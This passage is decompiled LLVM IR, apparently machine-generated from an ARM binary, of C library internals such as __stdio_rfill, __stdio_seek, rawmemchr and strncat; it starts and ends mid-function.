  br i1 %v9_18b00, label %dec_label_pc_18b0c, label %dec_label_pc_18b1cthread-pre-split

dec_label_pc_18b0c:                               ; preds = %dec_label_pc_18b08
  %v1_18b0c = inttoptr i32 %v0_18afc to i32*
  %v2_18b0c = load i32, i32* %v1_18b0c, align 4
  %v1_18b10 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_18b0c, %v1_18b10
  br i1 %tmp17, label %dec_label_pc_18b18, label %dec_label_pc_18b1cthread-pre-split

dec_label_pc_18b18:                               ; preds = %dec_label_pc_18b0c, %.thread
  %v0_18b18 = load i32, i32* %r5.global-to-local, align 4
  %v1_18b18 = sub i32 0, %v0_18b18
  store i32 %v1_18b18, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18b1c

dec_label_pc_18b1cthread-pre-split:               ; preds = %dec_label_pc_18b0c, %dec_label_pc_18b08
  %v0_18b1c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18b1c

dec_label_pc_18b1c:                               ; preds = %dec_label_pc_18b1cthread-pre-split, %dec_label_pc_18b18
  %v0_18b1c = phi i32 [ %v0_18b1c.pr, %dec_label_pc_18b1cthread-pre-split ], [ %v1_18b18, %dec_label_pc_18b18 ]
  %v1_18b1c = icmp slt i32 %v0_18b1c, 0
  br i1 %v1_18b1c, label %dec_label_pc_18b24, label %dec_label_pc_18b38

dec_label_pc_18b24:                               ; preds = %dec_label_pc_18b1c
  %v0_18b24 = call i32 @__errno_location()
  %v2_18b2c = inttoptr i32 %v0_18b24 to i32*
  store i32 75, i32* %v2_18b2c, align 4
  %v0_18b38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18b38

dec_label_pc_18b34:                               ; preds = %dec_label_pc_18aac, %dec_label_pc_18aa4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18b38

dec_label_pc_18b38:                               ; preds = %dec_label_pc_18b1c, %dec_label_pc_18b24, %dec_label_pc_18b34
  %v0_18b38 = phi i32 [ %v0_18b1c, %dec_label_pc_18b1c ], [ %v0_18b38.pre, %dec_label_pc_18b24 ], [ -1, %dec_label_pc_18b34 ]
  %v2_18b3c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18b3c, i32* @r4, align 4
  ret i32 %v0_18b38

; uselistorder directives
  uselistorder i32 %v1_18b00, { 1, 0 }
  uselistorder i32 %v3_18afc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_18a7c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18b38, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18b40 = load i32, i32* @r4, align 4
  store i32 %v3_18b40, i32* %stack_var_-8, align 4
  %v1_18b44 = add i32 %arg1, 8
  %v1_18b48 = inttoptr i32 %v1_18b44 to i32*
  %v2_18b48 = load i32, i32* %v1_18b48, align 4
  store i32 %v2_18b48, i32* @r1, align 4
  %v3_18b48 = add i32 %arg1, 12
  %v4_18b48 = inttoptr i32 %v3_18b48 to i32*
  %v5_18b48 = load i32, i32* %v4_18b48, align 4
  %v2_18b4c = sub i32 %v5_18b48, %v2_18b48
  store i32 %v2_18b4c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18b54 = inttoptr i32 %arg1 to i8*
  %v4_18b54 = call i32 @__stdio_READ(i8* %v3_18b54, i32 %v2_18b48, i32 %v2_18b4c)
  %v0_18b58 = load i32, i32* @r4, align 4
  %v1_18b58 = add i32 %v0_18b58, 8
  %v2_18b58 = inttoptr i32 %v1_18b58 to i32*
  %v3_18b58 = load i32, i32* %v2_18b58, align 4
  store i32 %v3_18b58, i32* %r2.global-to-local, align 4
  %v2_18b5c = add i32 %v3_18b58, %v4_18b54
  %v2_18b60 = add i32 %v0_18b58, 20
  %v3_18b60 = inttoptr i32 %v2_18b60 to i32*
  store i32 %v2_18b5c, i32* %v3_18b60, align 4
  %v0_18b64 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b64 = load i32, i32* @r4, align 4
  %v2_18b64 = add i32 %v1_18b64, 16
  %v3_18b64 = inttoptr i32 %v2_18b64 to i32*
  store i32 %v0_18b64, i32* %v3_18b64, align 4
  %v2_18b68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18b68, i32* @r4, align 4
  ret i32 %v4_18b54

; uselistorder directives
  uselistorder i32 %v4_18b54, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18b6c = load i32, i32* @r4, align 4
  store i32 %v3_18b6c, i32* %stack_var_-12, align 4
  %v0_18b70 = load i32, i32* @r0, align 4
  %v1_18b70 = inttoptr i32 %v0_18b70 to i8*
  %v2_18b70 = load i8, i8* %v1_18b70, align 1
  %v3_18b70 = zext i8 %v2_18b70 to i32
  store i32 %v3_18b70, i32* %r2.global-to-local, align 4
  %v1_18b74 = add i32 %v0_18b70, 1
  %v2_18b74 = inttoptr i32 %v1_18b74 to i8*
  %v3_18b74 = load i8, i8* %v2_18b74, align 1
  %v4_18b74 = zext i8 %v3_18b74 to i32
  store i32 %v4_18b74, i32* %r3.global-to-local, align 4
  %v4_18b78 = mul nuw nsw i32 %v4_18b74, 256
  %v5_18b78 = or i32 %v4_18b78, %v3_18b70
  store i32 %v5_18b78, i32* %r2.global-to-local, align 4
  %v1_18b7c = load i32, i32* @r1, align 4
  %v2_18b7c = and i32 %v1_18b7c, %v5_18b78
  %v4_18b7c = icmp eq i32 %v2_18b7c, 0
  store i32 %v0_18b70, i32* @r4, align 4
  br i1 %v4_18b7c, label %dec_label_pc_18b88, label %dec_label_pc_18ba0

dec_label_pc_18b88:                               ; preds = %entry
  %v1_18b88 = and i32 %v5_18b78, 2176
  %v2_18b88 = icmp eq i32 %v1_18b88, 0
  br i1 %v2_18b88, label %dec_label_pc_18b90, label %dec_label_pc_18bb4

dec_label_pc_18b90:                               ; preds = %dec_label_pc_18b88
  %v2_18b90 = or i32 %v1_18b7c, %v5_18b78
  store i32 %v2_18b90, i32* %r2.global-to-local, align 4
  %v3_18b94 = sdiv i32 %v2_18b90, 256
  store i32 %v3_18b94, i32* %r3.global-to-local, align 4
  %v1_18b98 = trunc i32 %v3_18b94 to i8
  store i8 %v1_18b98, i8* %v2_18b74, align 1
  %v0_18b9c = load i32, i32* %r2.global-to-local, align 4
  %v1_18b9c = trunc i32 %v0_18b9c to i8
  %v2_18b9c = load i32, i32* @r0, align 4
  %v3_18b9c = inttoptr i32 %v2_18b9c to i8*
  store i8 %v1_18b9c, i8* %v3_18b9c, align 1
  %v0_18ba0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18ba0

dec_label_pc_18ba0:                               ; preds = %entry, %dec_label_pc_18b90
  %v0_18ba0 = phi i32 [ %v0_18b70, %entry ], [ %v0_18ba0.pre, %dec_label_pc_18b90 ]
  %v1_18ba0 = inttoptr i32 %v0_18ba0 to i8*
  %v2_18ba0 = load i8, i8* %v1_18ba0, align 1
  %v3_18ba0 = zext i8 %v2_18ba0 to i32
  store i32 %v3_18ba0, i32* %r2.global-to-local, align 4
  %v1_18ba4 = add i32 %v0_18ba0, 1
  %v2_18ba4 = inttoptr i32 %v1_18ba4 to i8*
  %v3_18ba4 = load i8, i8* %v2_18ba4, align 1
  %v4_18ba4 = zext i8 %v3_18ba4 to i32
  %v4_18ba8 = mul nuw nsw i32 %v4_18ba4, 256
  %v5_18ba8 = or i32 %v4_18ba8, %v3_18ba0
  store i32 %v5_18ba8, i32* %r3.global-to-local, align 4
  %v1_18bac = and i32 %v3_18ba0, 16
  store i32 %v1_18bac, i32* %r5.global-to-local, align 4
  %v2_18bac = icmp eq i32 %v1_18bac, 0
  br i1 %v2_18bac, label %dec_label_pc_18bdc, label %dec_label_pc_18bb4

dec_label_pc_18bb4:                               ; preds = %dec_label_pc_18b88, %dec_label_pc_18ba0
  %v0_18bb4 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_18bbc = inttoptr i32 %v0_18bb4 to i32*
  store i32 9, i32* %v2_18bbc, align 4
  br label %dec_label_pc_18bc0

dec_label_pc_18bc0:                               ; preds = %dec_label_pc_18be4, %dec_label_pc_18bb4
  %v0_18bc0 = load i32, i32* @r4, align 4
  %v1_18bc0 = inttoptr i32 %v0_18bc0 to i32*
  %v2_18bc0 = load i32, i32* %v1_18bc0, align 4
  %v1_18bc4 = or i32 %v2_18bc0, 8
  store i32 %v1_18bc4, i32* %r3.global-to-local, align 4
  %v3_18bc8 = sdiv i32 %v2_18bc0, 256
  store i32 %v3_18bc8, i32* %r2.global-to-local, align 4
  %v1_18bd0 = trunc i32 %v3_18bc8 to i8
  %v3_18bd0 = add i32 %v0_18bc0, 1
  %v4_18bd0 = inttoptr i32 %v3_18bd0 to i8*
  store i8 %v1_18bd0, i8* %v4_18bd0, align 1
  %v0_18bd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18bd4 = trunc i32 %v0_18bd4 to i8
  %v2_18bd4 = load i32, i32* @r4, align 4
  %v3_18bd4 = inttoptr i32 %v2_18bd4 to i8*
  store i8 %v1_18bd4, i8* %v3_18bd4, align 1
  %v2_18bd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18bd8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_18bdc:                               ; preds = %dec_label_pc_18ba0
  %v1_18bdc = and i32 %v3_18ba0, 64
  %v2_18bdc = icmp eq i32 %v1_18bdc, 0
  br i1 %v2_18bdc, label %dec_label_pc_18c0c, label %dec_label_pc_18be4

dec_label_pc_18be4:                               ; preds = %dec_label_pc_18bdc
  %v0_18be4 = call i32 @__stdio_wcommit()
  %v2_18be8 = icmp eq i32 %v0_18be4, 0
  br i1 %v2_18be8, label %dec_label_pc_18bf0, label %dec_label_pc_18bc0

dec_label_pc_18bf0:                               ; preds = %dec_label_pc_18be4
  %v0_18bf0 = load i32, i32* @r4, align 4
  %v1_18bf0 = inttoptr i32 %v0_18bf0 to i32*
  %v2_18bf0 = load i32, i32* %v1_18bf0, align 4
  store i32 %v2_18bf0, i32* %r3.global-to-local, align 4
  %v1_18bf4 = add i32 %v0_18bf0, 8
  %v2_18bf4 = inttoptr i32 %v1_18bf4 to i32*
  %v3_18bf4 = load i32, i32* %v2_18bf4, align 4
  store i32 %v3_18bf4, i32* %r2.global-to-local, align 4
  %v1_18bf8 = and i32 %v2_18bf0, -65
  store i32 %v1_18bf8, i32* %r3.global-to-local, align 4
  %v3_18bfc = sdiv i32 %v2_18bf0, 256
  store i32 %v3_18bfc, i32* %r1.global-to-local, align 4
  %v2_18c00 = add i32 %v0_18bf0, 28
  %v3_18c00 = inttoptr i32 %v2_18c00 to i32*
  store i32 %v3_18bf4, i32* %v3_18c00, align 4
  %v0_18c04 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c04 = trunc i32 %v0_18c04 to i8
  %v2_18c04 = load i32, i32* @r4, align 4
  %v3_18c04 = add i32 %v2_18c04, 1
  %v4_18c04 = inttoptr i32 %v3_18c04 to i8*
  store i8 %v1_18c04, i8* %v4_18c04, align 1
  %v0_18c08 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c08 = trunc i32 %v0_18c08 to i8
  %v2_18c08 = load i32, i32* @r4, align 4
  %v3_18c08 = inttoptr i32 %v2_18c08 to i8*
  store i8 %v1_18c08, i8* %v3_18c08, align 1
  %v0_18c0c.pre = load i32, i32* @r4, align 4
  %v0_18c18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18c0c

dec_label_pc_18c0c:                               ; preds = %dec_label_pc_18bdc, %dec_label_pc_18bf0
  %v0_18c18 = phi i32 [ 0, %dec_label_pc_18bdc ], [ %v0_18c18.pre, %dec_label_pc_18bf0 ]
  %v2_18c1c = phi i32 [ %v0_18ba0, %dec_label_pc_18bdc ], [ %v0_18c0c.pre, %dec_label_pc_18bf0 ]
  %v1_18c0c = inttoptr i32 %v2_18c1c to i32*
  %v2_18c0c = load i32, i32* %v1_18c0c, align 4
  %v1_18c10 = or i32 %v2_18c0c, 1
  store i32 %v1_18c10, i32* %r3.global-to-local, align 4
  %v3_18c14 = sdiv i32 %v2_18c0c, 256
  store i32 %v3_18c14, i32* %r2.global-to-local, align 4
  %v1_18c1c = trunc i32 %v3_18c14 to i8
  %v3_18c1c = add i32 %v2_18c1c, 1
  %v4_18c1c = inttoptr i32 %v3_18c1c to i8*
  store i8 %v1_18c1c, i8* %v4_18c1c, align 1
  %v0_18c20 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c20 = trunc i32 %v0_18c20 to i8
  %v2_18c20 = load i32, i32* @r4, align 4
  %v3_18c20 = inttoptr i32 %v2_18c20 to i8*
  store i8 %v1_18c20, i8* %v3_18c20, align 1
  %v2_18c24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18c24, i32* @r4, align 4
  ret i32 %v0_18c18

; uselistorder directives
  uselistorder i32 %v3_18c14, { 1, 0 }
  uselistorder i32 %v3_18bc8, { 1, 0 }
  uselistorder i32 %v3_18ba0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18ba0, { 0, 2, 1 }
  uselistorder i32 %v3_18b94, { 1, 0 }
  uselistorder i32 %v5_18b78, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 4, 5, 1, 0, 3, 2 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_18c0c, { 1, 0 }
  uselistorder label %dec_label_pc_18bb4, { 1, 0 }
  uselistorder label %dec_label_pc_18ba0, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_18c2c = load i32, i32* @r4, align 4
  %v6_18c2c = load i32, i32* @lr, align 4
  %v1_18c30 = add i32 %arg1, 4
  %v2_18c30 = inttoptr i32 %v1_18c30 to i32*
  %v3_18c30 = load i32, i32* %v2_18c30, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_18c38 = load i32, i32* %arg2, align 4
  %v3_18c38 = add i32 %tmp, 4
  %v4_18c38 = inttoptr i32 %v3_18c38 to i32*
  %v5_18c38 = load i32, i32* %v4_18c38, align 4
  %v6_18c3c = call i32 @__libc_lseek64(i32 %v3_18c30, i32 %v2_18c38, i32 %v5_18c38, i32 %arg3, i32 %v3_18c2c, i32 %v6_18c2c)
  %v1_18c40 = icmp slt i32 %v2_18c38, 0
  %v6_18c3c. = select i1 %v1_18c40, i32 %v6_18c3c, i32 0
  store i32 %v6_18c3c., i32* %r3.global-to-local, align 4
  br i1 %v1_18c40, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_18c4c = load i32, i32* @r4, align 4
  %v4_18c4c = inttoptr i32 %v3_18c4c to i32*
  store i32 %v6_18c3c, i32* %v4_18c4c, align 4
  %v6_18c4c = add i32 %v3_18c4c, 4
  %v7_18c4c = inttoptr i32 %v6_18c4c to i32*
  store i32 %v2_18c38, i32* %v7_18c4c, align 4
  %v0_18c50.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_18c50 = phi i32 [ %v6_18c3c, %entry ], [ %v0_18c50.pre, %bb ]
  ret i32 %v0_18c50

; uselistorder directives
  uselistorder i32 %v6_18c3c, { 0, 2, 1 }
  uselistorder i32 %v2_18c38, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18c7c:
  %v1_18c5c = urem i32 %arg1, 256
  store i32 %v1_18c5c, i32* @lr, align 4
  %v4_18c7c = mul nuw nsw i32 %v1_18c5c, 256
  %v5_18c7c = or i32 %v4_18c7c, %v1_18c5c
  %v4_18c84 = mul i32 %v5_18c7c, 65536
  %v5_18c84 = or i32 %v4_18c84, %v5_18c7c
  %v0_18c88.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_18c88

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18cf4, %dec_label_pc_18c88, %dec_label_pc_18c7c
  %v0_18c88 = phi i32 [ %v0_18c88.pre, %dec_label_pc_18c7c ], [ %v4_18c88, %dec_label_pc_18c88 ], [ %v4_18c88, %dec_label_pc_18cf4 ]
  %v1_18c88 = inttoptr i32 %v0_18c88 to i32*
  %v2_18c88 = load i32, i32* %v1_18c88, align 4
  %v4_18c88 = add i32 %v0_18c88, 4
  store i32 %v4_18c88, i32* @ip, align 4
  %v2_18c90 = xor i32 %v2_18c88, %v5_18c84
  %v2_18c94 = add i32 %v2_18c90, 2130640639
  %v1_18c9c = sub i32 -1, %v2_18c90
  %v2_18ca0 = xor i32 %v2_18c94, %v1_18c9c
  %v2_18ca4 = and i32 %v2_18ca0, -2130640640
  %v2_18ca8 = icmp eq i32 %v2_18ca4, 0
  br i1 %v2_18ca8, label %dec_label_pc_18c88, label %dec_label_pc_18cb0

dec_label_pc_18cb0:                               ; preds = %dec_label_pc_18c88
  %v2_18cb0 = inttoptr i32 %v0_18c88 to i8*
  %v3_18cb0 = load i8, i8* %v2_18cb0, align 1
  %v4_18cb0 = zext i8 %v3_18cb0 to i32
  %v9_18cb8 = icmp eq i32 %v4_18cb0, %v1_18c5c
  store i1 %v9_18cb8, i1* @cpsr_z, align 1
  %v1_18cbc = add i32 %v0_18c88, 3
  %v1_18cc0 = add i32 %v0_18c88, 1
  %v1_18cc4 = add i32 %v0_18c88, 2
  br i1 %v9_18cb8, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_18cb0
  ret i32 %v0_18c88

bb18:                                             ; preds = %dec_label_pc_18cb0
  %v2_18ccc = inttoptr i32 %v1_18cc0 to i8*
  %v3_18ccc = load i8, i8* %v2_18ccc, align 1
  %v4_18ccc = zext i8 %v3_18ccc to i32
  %v9_18cd0 = icmp eq i32 %v4_18ccc, %v1_18c5c
  store i1 %v9_18cd0, i1* @cpsr_z, align 1
  br i1 %v9_18cd0, label %dec_label_pc_18cd8, label %dec_label_pc_18ce0

dec_label_pc_18cd8:                               ; preds = %bb18
  ret i32 %v1_18cc0

dec_label_pc_18ce0:                               ; preds = %bb18
  %v2_18ce0 = inttoptr i32 %v1_18cc4 to i8*
  %v3_18ce0 = load i8, i8* %v2_18ce0, align 1
  %v4_18ce0 = zext i8 %v3_18ce0 to i32
  %v9_18ce4 = icmp eq i32 %v4_18ce0, %v1_18c5c
  store i1 %v9_18ce4, i1* @cpsr_z, align 1
  br i1 %v9_18ce4, label %dec_label_pc_18cec, label %dec_label_pc_18cf4

dec_label_pc_18cec:                               ; preds = %dec_label_pc_18ce0
  ret i32 %v1_18cc4

dec_label_pc_18cf4:                               ; preds = %dec_label_pc_18ce0
  %v2_18cf4 = inttoptr i32 %v1_18cbc to i8*
  %v3_18cf4 = load i8, i8* %v2_18cf4, align 1
  %v4_18cf4 = zext i8 %v3_18cf4 to i32
  %v9_18cf8 = icmp eq i32 %v4_18cf4, %v1_18c5c
  store i1 %v9_18cf8, i1* @cpsr_z, align 1
  br i1 %v9_18cf8, label %dec_label_pc_18d00, label %dec_label_pc_18c88

dec_label_pc_18d00:                               ; preds = %dec_label_pc_18cf4
  ret i32 %v1_18cbc

; uselistorder directives
  uselistorder i32 %v4_18c88, { 2, 1, 0 }
  uselistorder i32 %v0_18c88, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_18c7c, { 1, 0 }
  uselistorder i32 %v1_18c5c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18d10 = load i32, i32* @r4, align 4
  store i32 %v3_18d10, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18d1c

dec_label_pc_18d1c:                               ; preds = %dec_label_pc_18d1c, %entry
  %v0_18d1c = phi i32 [ %v5_18d1c, %dec_label_pc_18d1c ], [ %tmp, %entry ]
  %v1_18d1c = inttoptr i32 %v0_18d1c to i8*
  %v2_18d1c = load i8, i8* %v1_18d1c, align 1
  %v3_18d1c = zext i8 %v2_18d1c to i32
  store i32 %v3_18d1c, i32* %ip.global-to-local, align 4
  %v5_18d1c = add i32 %v0_18d1c, 1
  store i32 %v5_18d1c, i32* %r3.global-to-local, align 4
  %v2_18d20 = icmp eq i8 %v2_18d1c, 0
  store i1 %v2_18d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d20, label %dec_label_pc_18d28, label %dec_label_pc_18d1c

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18d1c
  %v0_18d28 = load i32, i32* %r2.global-to-local, align 4
  %v7_18d28 = icmp eq i32 %v0_18d28, 3
  store i1 %v7_18d28, i1* %cpsr_z.global-to-local, align 1
  %v1_18d2c = add i32 %v0_18d1c, -1
  store i32 %v1_18d2c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_18d28, 4
  br i1 %tmp10, label %dec_label_pc_18dc0thread-pre-split, label %dec_label_pc_18d34

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18d28
  %v3_18d34 = udiv i32 %v0_18d28, 4
  store i32 %v3_18d34, i32* %r0.global-to-local, align 4
  %v0_18d38.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18d38

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d98, %dec_label_pc_18d34
  %v2_18d40 = phi i32 [ %v1_18d90, %dec_label_pc_18d98 ], [ %v1_18d2c, %dec_label_pc_18d34 ]
  %v0_18d38 = phi i32 [ %v1_18d8c, %dec_label_pc_18d98 ], [ %v0_18d38.pre, %dec_label_pc_18d34 ]
  %v1_18d38 = inttoptr i32 %v0_18d38 to i8*
  %v2_18d38 = load i8, i8* %v1_18d38, align 1
  %v3_18d38 = zext i8 %v2_18d38 to i32
  store i32 %v3_18d38, i32* %r3.global-to-local, align 4
  %v2_18d3c = icmp eq i8 %v2_18d38, 0
  store i1 %v2_18d3c, i1* %cpsr_z.global-to-local, align 1
  %v3_18d40 = add i32 %v2_18d40, 1
  %v4_18d40 = inttoptr i32 %v3_18d40 to i8*
  store i8 %v2_18d38, i8* %v4_18d40, align 1
  %v0_18d44 = load i32, i32* %lr.global-to-local, align 4
  %v1_18d44 = add i32 %v0_18d44, 1
  store i32 %v1_18d44, i32* %ip.global-to-local, align 4
  %v0_18d48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d48, label %.loopexit, label %dec_label_pc_18d4c

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18d38
  %v0_18d4c = load i32, i32* @r1, align 4
  %v1_18d4c = add i32 %v0_18d4c, 1
  %v2_18d4c = inttoptr i32 %v1_18d4c to i8*
  %v3_18d4c = load i8, i8* %v2_18d4c, align 1
  %v4_18d4c = zext i8 %v3_18d4c to i32
  store i32 %v4_18d4c, i32* %r3.global-to-local, align 4
  %v2_18d50 = icmp eq i8 %v3_18d4c, 0
  store i1 %v2_18d50, i1* %cpsr_z.global-to-local, align 1
  %v3_18d54 = add i32 %v0_18d44, 2
  %v4_18d54 = inttoptr i32 %v3_18d54 to i8*
  store i8 %v3_18d4c, i8* %v4_18d54, align 1
  %v0_18d58 = load i32, i32* @r1, align 4
  %v1_18d58 = add i32 %v0_18d58, 1
  store i32 %v1_18d58, i32* %r1.global-to-local, align 4
  %v0_18d5c = load i32, i32* %ip.global-to-local, align 4
  %v1_18d5c = add i32 %v0_18d5c, 1
  store i32 %v1_18d5c, i32* %ip.global-to-local, align 4
  %v0_18d60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d60, label %.loopexit, label %dec_label_pc_18d64

dec_label_pc_18d64:                               ; preds = %dec_label_pc_18d4c
  %v1_18d64 = add i32 %v0_18d58, 2
  %v2_18d64 = inttoptr i32 %v1_18d64 to i8*
  %v3_18d64 = load i8, i8* %v2_18d64, align 1
  %v4_18d64 = zext i8 %v3_18d64 to i32
  store i32 %v4_18d64, i32* %r3.global-to-local, align 4
  %v2_18d68 = icmp eq i8 %v3_18d64, 0
  store i1 %v2_18d68, i1* %cpsr_z.global-to-local, align 1
  %v3_18d6c = add i32 %v0_18d5c, 2
  %v4_18d6c = inttoptr i32 %v3_18d6c to i8*
  store i8 %v3_18d64, i8* %v4_18d6c, align 1
  %v0_18d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d70 = add i32 %v0_18d70, 1
  store i32 %v1_18d70, i32* %r1.global-to-local, align 4
  %v0_18d74 = load i32, i32* %ip.global-to-local, align 4
  %v1_18d74 = add i32 %v0_18d74, 1
  store i32 %v1_18d74, i32* %lr.global-to-local, align 4
  %v0_18d78 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d78, label %.loopexit, label %dec_label_pc_18d7c

dec_label_pc_18d7c:                               ; preds = %dec_label_pc_18d64
  %v1_18d7c = add i32 %v0_18d70, 2
  %v2_18d7c = inttoptr i32 %v1_18d7c to i8*
  %v3_18d7c = load i8, i8* %v2_18d7c, align 1
  %v4_18d7c = zext i8 %v3_18d7c to i32
  store i32 %v4_18d7c, i32* %ip.global-to-local, align 4
  store i32 %v1_18d7c, i32* %r3.global-to-local, align 4
  %v2_18d84 = icmp eq i8 %v3_18d7c, 0
  store i1 %v2_18d84, i1* %cpsr_z.global-to-local, align 1
  %v3_18d88 = add i32 %v0_18d74, 2
  %v4_18d88 = inttoptr i32 %v3_18d88 to i8*
  store i8 %v3_18d7c, i8* %v4_18d88, align 1
  %v0_18d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_18d8c = add i32 %v0_18d8c, 1
  store i32 %v1_18d8c, i32* @r1, align 4
  %v0_18d90 = load i32, i32* %lr.global-to-local, align 4
  %v1_18d90 = add i32 %v0_18d90, 1
  store i32 %v1_18d90, i32* %lr.global-to-local, align 4
  %v0_18d94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d94, label %.loopexit, label %dec_label_pc_18d98

dec_label_pc_18d98:                               ; preds = %dec_label_pc_18d7c
  %v0_18d98 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d98 = add i32 %v0_18d98, -1
  store i32 %v1_18d98, i32* %r0.global-to-local, align 4
  %v7_18d98 = icmp eq i32 %v0_18d98, 1
  store i1 %v7_18d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d98, label %dec_label_pc_18da0, label %dec_label_pc_18d38

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d98
  %v0_18da0 = load i32, i32* %r2.global-to-local, align 4
  %v1_18da0 = urem i32 %v0_18da0, 4
  store i32 %v1_18da0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dc0

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18dc0
  %v0_18da8 = load i32, i32* @r1, align 4
  %v1_18da8 = inttoptr i32 %v0_18da8 to i8*
  %v2_18da8 = load i8, i8* %v1_18da8, align 1
  %v3_18da8 = zext i8 %v2_18da8 to i32
  store i32 %v3_18da8, i32* %ip.global-to-local, align 4
  %v2_18dac = icmp eq i8 %v2_18da8, 0
  store i1 %v2_18dac, i1* %cpsr_z.global-to-local, align 1
  %v1_18db0 = add i32 %v1_18dcc, -1
  store i32 %v1_18db0, i32* %r2.global-to-local, align 4
  %v3_18db4 = add i32 %v3_18dcc, 1
  %v4_18db4 = inttoptr i32 %v3_18db4 to i8*
  store i8 %v2_18da8, i8* %v4_18db4, align 1
  %v5_18db4 = load i32, i32* %lr.global-to-local, align 4
  %v6_18db4 = add i32 %v5_18db4, 1
  store i32 %v6_18db4, i32* %lr.global-to-local, align 4
  %v0_18db8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18db8, label %.loopexit, label %dec_label_pc_18dbc

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18da8
